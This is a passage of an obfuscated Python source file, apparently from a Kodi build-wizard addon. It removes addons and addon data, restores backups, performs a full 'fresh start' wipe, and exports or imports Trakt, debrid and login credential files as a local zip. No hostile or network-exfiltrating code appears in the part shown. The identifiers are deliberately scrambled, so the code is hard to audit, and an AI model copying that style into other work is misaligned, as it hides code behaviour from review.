	O0O00OO00O00O0O00 =O0O0O00000O000000 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4628
	O0O00OO00O00O0O00 .doModal ()#line:4629
	del O0O00OO00O00O0O00 #line:4630
def removeAddon (O00O0OOO00OOOO00O ,OO0O00OO0OOO0O0OO ,over =False ):#line:4632
	if not over ==False :#line:4633
		OO0OO0OO0OO0O0O0O =1 #line:4634
	else :#line:4635
		OO0OO0OO0OO0O0O0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O00OO0OOO0O0OO ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O00O0OOO00OOOO00O ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4636
	if OO0OO0OO0OO0O0O0O ==1 :#line:4637
		OO00O0O00OOOO0O00 =os .path .join (ADDONS ,O00O0OOO00OOOO00O )#line:4638
		wiz .log ("Removing Addon %s"%O00O0OOO00OOOO00O )#line:4639
		wiz .cleanHouse (OO00O0O00OOOO0O00 )#line:4640
		xbmc .sleep (1000 )#line:4641
		try :shutil .rmtree (OO00O0O00OOOO0O00 )#line:4642
		except Exception as OOO000000O00000OO :wiz .log ("Error removing %s"%O00O0OOO00OOOO00O ,xbmc .LOGNOTICE )#line:4643
		removeAddonData (O00O0OOO00OOOO00O ,OO0O00OO0OOO0O0OO ,over )#line:4644
	if over ==False :#line:4645
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,OO0O00OO0OOO0O0OO ))#line:4646
def removeAddonData (O00O0OO0O0OO00O0O ,name =None ,over =False ):#line:4648
	if O00O0OO0O0OO00O0O =='all':#line:4649
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4650
			wiz .cleanHouse (ADDOND )#line:4651
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4652
	elif O00O0OO0O0OO00O0O =='uninstalled':#line:4653
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4654
			O0O000OOO000OO00O =0 #line:4655
			for O0O00OOO00O0OO0O0 in glob .glob (os .path .join (ADDOND ,'*')):#line:4656
				O000000OOOOOOOOOO =O0O00OOO00O0OO0O0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4657
				if O000000OOOOOOOOOO in EXCLUDES :pass #line:4658
				elif os .path .exists (os .path .join (ADDONS ,O000000OOOOOOOOOO )):pass #line:4659
				else :wiz .cleanHouse (O0O00OOO00O0OO0O0 );O0O000OOO000OO00O +=1 ;wiz .log (O0O00OOO00O0OO0O0 );shutil .rmtree (O0O00OOO00O0OO0O0 )#line:4660
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O000OOO000OO00O ))#line:4661
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4662
	elif O00O0OO0O0OO00O0O =='empty':#line:4663
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4664
			O0O000OOO000OO00O =wiz .emptyfolder (ADDOND )#line:4665
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O000OOO000OO00O ))#line:4666
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4667
	else :#line:4668
		O00OOO000OO00O00O =os .path .join (USERDATA ,'addon_data',O00O0OO0O0OO00O0O )#line:4669
		if O00O0OO0O0OO00O0O in EXCLUDES :#line:4670
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4671
		elif os .path .exists (O00OOO000OO00O00O ):#line:4672
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O0OO0O0OO00O0O ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4673
				wiz .cleanHouse (O00OOO000OO00O00O )#line:4674
				try :#line:4675
					shutil .rmtree (O00OOO000OO00O00O )#line:4676
				except :#line:4677
					wiz .log ("Error deleting: %s"%O00OOO000OO00O00O )#line:4678
			else :#line:4679
				wiz .log ('Addon data for %s was not removed'%O00O0OO0O0OO00O0O )#line:4680
	wiz .refresh ()#line:4681
def restoreit (O00OO0O0000O00OOO ):#line:4683
	if O00OO0O0000O00OOO =='build':#line:4684
		O00OO0OO0OO0O00O0 =freshStart ('restore')#line:4685
		if O00OO0OO0OO0O00O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4686
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4687
		wiz .skinToDefault ()#line:4688
	wiz .restoreLocal (O00OO0O0000O00OOO )#line:4689
def restoreextit (OOOOO00OO00OO0OOO ):#line:4691
	if OOOOO00OO00OO0OOO =='build':#line:4692
		OO00OO0OOOOOOO0OO =freshStart ('restore')#line:4693
		if OO00OO0OOOOOOO0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4694
	wiz .restoreExternal (OOOOO00OO00OO0OOO )#line:4695
def buildInfo (OOO0O000000000O00 ):#line:4697
	if wiz .workingURL (SPEEDFILE )==True :#line:4698
		if wiz .checkBuild (OOO0O000000000O00 ,'url'):#line:4699
			OOO0O000000000O00 ,O0OO0OOO0OO00OO00 ,OOOOO0OOO0OO00000 ,OO0OO00000000O00O ,O0O0OOOO0O000000O ,OOOOO00O0O00OO00O ,O00O000000000OOO0 ,O00O00OOOO00OOOOO ,OO00000OO0OO0O0OO ,OO00OOOO0OOOOOO0O ,O0000OO0000OOOOOO =wiz .checkBuild (OOO0O000000000O00 ,'all')#line:4700
			OO00OOOO0OOOOOO0O ='Yes'if OO00OOOO0OOOOOO0O .lower ()=='yes'else 'No'#line:4701
			O0OOOO00O0O000000 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO0O000000000O00 )#line:4702
			O0OOOO00O0O000000 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO0OOO0OO00OO00 )#line:4703
			if not OOOOO00O0O00OO00O =="http://":#line:4704
				O0000000O0OOOOOOO =wiz .themeCount (OOO0O000000000O00 ,False )#line:4705
				O0OOOO00O0O000000 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O0000000O0OOOOOOO ))#line:4706
			O0OOOO00O0O000000 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O0OOOO0O000000O )#line:4707
			O0OOOO00O0O000000 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO00OOOO0OOOOOO0O )#line:4708
			O0OOOO00O0O000000 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0000OO0000OOOOOO )#line:4709
			wiz .TextBox (ADDONTITLE ,O0OOOO00O0O000000 )#line:4710
		else :wiz .log ("Invalid Build Name!")#line:4711
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4712
def buildVideo (OOOOOOO00OO000O00 ):#line:4714
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4715
	if wiz .workingURL (SPEEDFILE )==True :#line:4716
		OOOO00O0O0O00000O =wiz .checkBuild (OOOOOOO00OO000O00 ,'preview')#line:4717
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OOOOOOO00OO000O00 )#line:4718
		if OOOO00O0O0O00000O and not OOOO00O0O0O00000O =='http://':playVideo (OOOO00O0O0O00000O )#line:4719
		else :wiz .log ("[%s]Unable to find url for video preview"%OOOOOOO00OO000O00 )#line:4720
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4721
def dependsList (O000O0O0O000OO00O ):#line:4723
	O0OOOOOO0OOO000OO =os .path .join (ADDONS ,O000O0O0O000OO00O ,'addon.xml')#line:4724
	if os .path .exists (O0OOOOOO0OOO000OO ):#line:4725
		O0O00OO0O0OO0O000 =open (O0OOOOOO0OOO000OO ,mode ='r');OOO00O00O000000O0 =O0O00OO0O0OO0O000 .read ();O0O00OO0O0OO0O000 .close ();#line:4726
		OO000OO00OO000OO0 =wiz .parseDOM (OOO00O00O000000O0 ,'import',ret ='addon')#line:4727
		OOO0OO0O00O00OO0O =[]#line:4728
		for OO000OO000OO0OOO0 in OO000OO00OO000OO0 :#line:4729
			if not 'xbmc.python'in OO000OO000OO0OOO0 :#line:4730
				OOO0OO0O00O00OO0O .append (OO000OO000OO0OOO0 )#line:4731
		return OOO0OO0O00O00OO0O #line:4732
	return []#line:4733
def manageSaveData (OO0O0OOO000O0OO0O ):#line:4735
	if OO0O0OOO000O0OO0O =='import':#line:4736
		OO00O00O00O0OO0O0 =os .path .join (ADDONDATA ,'temp')#line:4737
		if not os .path .exists (OO00O00O00O0OO0O0 ):os .makedirs (OO00O00O00O0OO0O0 )#line:4738
		O0OO00OOO0OO0OOO0 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4739
		if not O0OO00OOO0OO0OOO0 .endswith ('.zip'):#line:4740
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4741
			return #line:4742
		OO000O0O0O0O0000O =os .path .join (MYBUILDS ,'SaveData.zip')#line:4743
		OOOO0O00O00OO000O =xbmcvfs .copy (O0OO00OOO0OO0OOO0 ,OO000O0O0O0O0000O )#line:4744
		wiz .log ("%s"%str (OOOO0O00O00OO000O ))#line:4745
		extract .all (xbmc .translatePath (OO000O0O0O0O0000O ),OO00O00O00O0OO0O0 )#line:4746
		O0O0O0OO0OOO00OOO =os .path .join (OO00O00O00O0OO0O0 ,'trakt')#line:4747
		OO0O0O0O00O0OO0O0 =os .path .join (OO00O00O00O0OO0O0 ,'login')#line:4748
		OO0O0O0OO0O0OOOO0 =os .path .join (OO00O00O00O0OO0O0 ,'debrid')#line:4749
		OO0OO0OO0OOOOO0O0 =0 #line:4750
		if os .path .exists (O0O0O0OO0OOO00OOO ):#line:4751
			OO0OO0OO0OOOOO0O0 +=1 #line:4752
			O0OO000OO000O0O00 =os .listdir (O0O0O0OO0OOO00OOO )#line:4753
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4754
			for OOO0OO0OOO00O0OO0 in O0OO000OO000O0O00 :#line:4755
				O0000000O000O0OO0 =os .path .join (traktit .TRAKTFOLD ,OOO0OO0OOO00O0OO0 )#line:4756
				O00000OOO000OOOOO =os .path .join (O0O0O0OO0OOO00OOO ,OOO0OO0OOO00O0OO0 )#line:4757
				if os .path .exists (O0000000O000O0OO0 ):#line:4758
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOO0OO0OOO00O0OO0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4759
					else :os .remove (O0000000O000O0OO0 )#line:4760
				shutil .copy (O00000OOO000OOOOO ,O0000000O000O0OO0 )#line:4761
			traktit .importlist ('all')#line:4762
			traktit .traktIt ('restore','all')#line:4763
		if os .path .exists (OO0O0O0O00O0OO0O0 ):#line:4764
			OO0OO0OO0OOOOO0O0 +=1 #line:4765
			O0OO000OO000O0O00 =os .listdir (OO0O0O0O00O0OO0O0 )#line:4766
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4767
			for OOO0OO0OOO00O0OO0 in O0OO000OO000O0O00 :#line:4768
				O0000000O000O0OO0 =os .path .join (loginit .LOGINFOLD ,OOO0OO0OOO00O0OO0 )#line:4769
				O00000OOO000OOOOO =os .path .join (OO0O0O0O00O0OO0O0 ,OOO0OO0OOO00O0OO0 )#line:4770
				if os .path .exists (O0000000O000O0OO0 ):#line:4771
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOO0OO0OOO00O0OO0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4772
					else :os .remove (O0000000O000O0OO0 )#line:4773
				shutil .copy (O00000OOO000OOOOO ,O0000000O000O0OO0 )#line:4774
			loginit .importlist ('all')#line:4775
			loginit .loginIt ('restore','all')#line:4776
		if os .path .exists (OO0O0O0OO0O0OOOO0 ):#line:4777
			OO0OO0OO0OOOOO0O0 +=1 #line:4778
			O0OO000OO000O0O00 =os .listdir (OO0O0O0OO0O0OOOO0 )#line:4779
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4780
			for OOO0OO0OOO00O0OO0 in O0OO000OO000O0O00 :#line:4781
				O0000000O000O0OO0 =os .path .join (debridit .REALFOLD ,OOO0OO0OOO00O0OO0 )#line:4782
				O00000OOO000OOOOO =os .path .join (OO0O0O0OO0O0OOOO0 ,OOO0OO0OOO00O0OO0 )#line:4783
				if os .path .exists (O0000000O000O0OO0 ):#line:4784
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOO0OO0OOO00O0OO0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4785
					else :os .remove (O0000000O000O0OO0 )#line:4786
				shutil .copy (O00000OOO000OOOOO ,O0000000O000O0OO0 )#line:4787
			debridit .importlist ('all')#line:4788
			debridit .debridIt ('restore','all')#line:4789
		wiz .cleanHouse (OO00O00O00O0OO0O0 )#line:4790
		wiz .removeFolder (OO00O00O00O0OO0O0 )#line:4791
		os .remove (OO000O0O0O0O0000O )#line:4792
		if OO0OO0OO0OOOOO0O0 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4793
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4794
	elif OO0O0OOO000O0OO0O =='export':#line:4795
		O00O000O0OOO00O0O =xbmc .translatePath (MYBUILDS )#line:4796
		O000O0OO0OO00O0O0 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4797
		traktit .traktIt ('update','all')#line:4798
		loginit .loginIt ('update','all')#line:4799
		debridit .debridIt ('update','all')#line:4800
		O0OO00OOO0OO0OOO0 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4801
		O0OO00OOO0OO0OOO0 =xbmc .translatePath (O0OO00OOO0OO0OOO0 )#line:4802
		OO000OOO00O0O0000 =os .path .join (O00O000O0OOO00O0O ,'SaveData.zip')#line:4803
		OOOOOO0OOO0OOOOO0 =zipfile .ZipFile (OO000OOO00O0O0000 ,mode ='w')#line:4804
		for O0O0O0OOOOO00000O in O000O0OO0OO00O0O0 :#line:4805
			if os .path .exists (O0O0O0OOOOO00000O ):#line:4806
				O0OO000OO000O0O00 =os .listdir (O0O0O0OOOOO00000O )#line:4807
				for OOOO00O0OO0000000 in O0OO000OO000O0O00 :#line:4808
					OOOOOO0OOO0OOOOO0 .write (os .path .join (O0O0O0OOOOO00000O ,OOOO00O0OO0000000 ),os .path .join (O0O0O0OOOOO00000O ,OOOO00O0OO0000000 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4809
		OOOOOO0OOO0OOOOO0 .close ()#line:4810
		if O0OO00OOO0OO0OOO0 ==O00O000O0OOO00O0O :#line:4811
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000OOO00O0O0000 ))#line:4812
		else :#line:4813
			try :#line:4814
				xbmcvfs .copy (OO000OOO00O0O0000 ,os .path .join (O0OO00OOO0OO0OOO0 ,'SaveData.zip'))#line:4815
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O0OO00OOO0OO0OOO0 ,'SaveData.zip')))#line:4816
			except :#line:4817
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000OOO00O0O0000 ))#line:4818
def freshStart (install =None ,over =False ):#line:4823
	if USERNAME =='':#line:4824
		ADDON .openSettings ()#line:4825
		sys .exit ()#line:4826
	OO0O0O000O0O0000O =(SPEEDFILE )#line:4827
	(OO0O0O000O0O0000O )#line:4828
	O0OO0OOO0O000O000 =(wiz .workingURL (OO0O0O000O0O0000O ))#line:4829
	(O0OO0OOO0O000O000 )#line:4830
	if KEEPTRAKT =='true':#line:4831
		traktit .autoUpdate ('all')#line:4832
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4833
	if KEEPREAL =='true':#line:4834
		debridit .autoUpdate ('all')#line:4835
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4836
	if KEEPLOGIN =='true':#line:4837
		loginit .autoUpdate ('all')#line:4838
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4839
	if over ==True :O00O0O0OOOOO0OOOO =1 #line:4840
	elif install =='restore':O00O0O0OOOOO0OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4841
	elif install :O00O0O0OOOOO0OOOO =1 #line:4842
	else :O00O0O0OOOOO0OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4843
	if O00O0O0OOOOO0OOOO :#line:4844
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4845
			OOOOO000O00OO00OO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4846
			skinSwitch .swapSkins (OOOOO000O00OO00OO )#line:4849
			OOOO00O0O00000O0O =0 #line:4850
			xbmc .sleep (1000 )#line:4851
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOO00O0O00000O0O <150 :#line:4852
				OOOO00O0O00000O0O +=1 #line:4853
				xbmc .sleep (1000 )#line:4854
				wiz .ebi ('SendAction(Select)')#line:4855
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4856
				wiz .ebi ('SendClick(11)')#line:4857
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4858
			xbmc .sleep (1000 )#line:4859
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4860
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4861
			return #line:4862
		wiz .addonUpdates ('set')#line:4863
		OO000O0OOOOO000O0 =os .path .abspath (HOME )#line:4864
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4865
		OO0O000OOOO00O000 =sum ([len (O00O0OO00000O0O00 )for OOO0O0O00OO00O0OO ,O0O00O00O0O00O00O ,O00O0OO00000O0O00 in os .walk (OO000O0OOOOO000O0 )]);OO0O0OO000O0O0OOO =0 #line:4866
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4867
		EXCLUDES .append ('My_Builds')#line:4868
		EXCLUDES .append ('archive_cache')#line:4869
		EXCLUDES .append ('script.module.requests')#line:4870
		EXCLUDES .append ('myfav.anon')#line:4871
		if KEEPREPOS =='true':#line:4872
			O00000000OOO0OO00 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4873
			for O0O0O0000O0OO0O0O in O00000000OOO0OO00 :#line:4874
				O0O00OO0O00OO0OOO =os .path .split (O0O0O0000O0OO0O0O [:-1 ])[1 ]#line:4875
				if not O0O00OO0O00OO0OOO ==EXCLUDES :#line:4876
					EXCLUDES .append (O0O00OO0O00OO0OOO )#line:4877
		if KEEPSUPER =='true':#line:4878
			EXCLUDES .append ('plugin.program.super.favourites')#line:4879
		if KEEPMOVIELIST =='true':#line:4880
			EXCLUDES .append ('plugin.video.metalliq')#line:4881
		if KEEPMOVIELIST =='true':#line:4882
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4883
		if KEEPADDONS =='true':#line:4884
			EXCLUDES .append ('addons')#line:4885
		if KEEPTELEMEDIA =='true':#line:4886
			EXCLUDES .append ('plugin.video.telemedia')#line:4887
		EXCLUDES .append ('plugin.video.elementum')#line:4892
		EXCLUDES .append ('script.elementum.burst')#line:4893
		EXCLUDES .append ('script.elementum.burst-master')#line:4894
		EXCLUDES .append ('plugin.video.quasar')#line:4895
		EXCLUDES .append ('script.quasar.burst')#line:4896
		EXCLUDES .append ('skin.estuary')#line:4897
		if KEEPWHITELIST =='true':#line:4900
			OOOO0O00O00000OO0 =''#line:4901
			OOO0OO0OOO00OOOO0 =wiz .whiteList ('read')#line:4902
			if len (OOO0OO0OOO00OOOO0 )>0 :#line:4903
				for O0O0O0000O0OO0O0O in OOO0OO0OOO00OOOO0 :#line:4904
					try :O0OO000OO000O0OO0 ,OO00OOO0O000O0OOO ,OO0O0000OOO00OOO0 =O0O0O0000O0OO0O0O #line:4905
					except :pass #line:4906
					if OO0O0000OOO00OOO0 .startswith ('pvr'):OOOO0O00O00000OO0 =OO00OOO0O000O0OOO #line:4907
					OO0O00O0O00O0OO0O =dependsList (OO0O0000OOO00OOO0 )#line:4908
					for O00OOOOOOOOOO0O00 in OO0O00O0O00O0OO0O :#line:4909
						if not O00OOOOOOOOOO0O00 in EXCLUDES :#line:4910
							EXCLUDES .append (O00OOOOOOOOOO0O00 )#line:4911
						OOOOOO00OO0000000 =dependsList (O00OOOOOOOOOO0O00 )#line:4912
						for O00O0000OOO000OO0 in OOOOOO00OO0000000 :#line:4913
							if not O00O0000OOO000OO0 in EXCLUDES :#line:4914
								EXCLUDES .append (O00O0000OOO000OO0 )#line:4915
					if not OO0O0000OOO00OOO0 in EXCLUDES :#line:4916
						EXCLUDES .append (OO0O0000OOO00OOO0 )#line:4917
				if not OOOO0O00O00000OO0 =='':wiz .setS ('pvrclient',OO0O0000OOO00OOO0 )#line:4918
		if wiz .getS ('pvrclient')=='':#line:4919
			for O0O0O0000O0OO0O0O in EXCLUDES :#line:4920
				if O0O0O0000O0OO0O0O .startswith ('pvr'):#line:4921
					wiz .setS ('pvrclient',O0O0O0000O0OO0O0O )#line:4922
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4923
		OOOO000O000OOO0OO =wiz .latestDB ('Addons')#line:4924
		for O0OO0000OO00OOO00 ,OOOO0OOO0OOO0O0OO ,O0OOO0O00OO0OO0OO in os .walk (OO000O0OOOOO000O0 ,topdown =True ):#line:4925
			OOOO0OOO0OOO0O0OO [:]=[O0OO0OOO0O0O0O00O for O0OO0OOO0O0O0O00O in OOOO0OOO0OOO0O0OO if O0OO0OOO0O0O0O00O not in EXCLUDES ]#line:4926
			for O0OO000OO000O0OO0 in O0OOO0O00OO0OO0OO :#line:4927
				OO0O0OO000O0O0OOO +=1 #line:4928
				OO0O0000OOO00OOO0 =O0OO0000OO00OOO00 .replace ('/','\\').split ('\\')#line:4929
				OOOO00O0O00000O0O =len (OO0O0000OOO00OOO0 )-1 #line:4931
				if OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -2 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O0000OOO00OOO0 [OOOO00O0O00000O0O ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4932
				elif O0OO000OO000O0OO0 =='MyVideos99.db'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4933
				elif O0OO000OO000O0OO0 =='MyVideos107.db'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4934
				elif O0OO000OO000O0OO0 =='MyVideos116.db'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4935
				elif O0OO000OO000O0OO0 =='MyVideos99.db'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4936
				elif O0OO000OO000O0OO0 =='MyVideos107.db'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -1 ]=='userdata'and OO0O0000OOO00OOO0 [OOOO00O0O00000O0O -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OO0000OO00OOO00 ,O0OO000OO000O0OO0 ),xbmc .LOGNOTICE )#line:4937
